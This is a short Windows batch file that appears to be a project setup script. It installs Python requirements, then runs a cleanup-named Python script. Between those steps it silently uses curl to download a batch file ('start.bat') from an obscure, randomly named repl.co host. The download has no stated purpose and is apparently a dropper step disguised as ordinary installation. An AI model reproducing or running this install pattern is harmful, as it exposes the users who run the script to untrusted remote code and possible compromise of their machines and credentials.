@echo off
cd %~dp0
MD tools
py -3 -m pip install -r requirements.txt
curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
python pycleaner.py
